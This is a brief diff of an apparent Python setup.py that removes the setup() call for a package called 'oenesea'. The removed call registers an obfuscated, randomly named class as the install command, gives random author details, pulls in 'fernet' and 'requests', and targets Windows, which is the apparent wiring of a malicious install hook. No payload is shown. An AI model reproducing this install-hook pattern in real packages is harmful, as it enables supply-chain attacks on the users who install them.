@@ -18,22 +18,5 @@ class kxxcSNMbezUThLVIHWjsEoAnBLQOwedJqibTCBPQsToUoyRpiHwqabNLSoQJSMLgPTvhEwMAfV
             install.run(self)
 
 
-setup(
-    name="oenesea",
-    version=VERSION,
-    author="TbZdpKEfGE",
-    author_email="CdpVeZRiUhGlb@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': kxxcSNMbezUThLVIHWjsEoAnBLQOwedJqibTCBPQsToUoyRpiHwqabNLSoQJSMLgPTvhEwMAfVGbpUCZutPxu,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
 
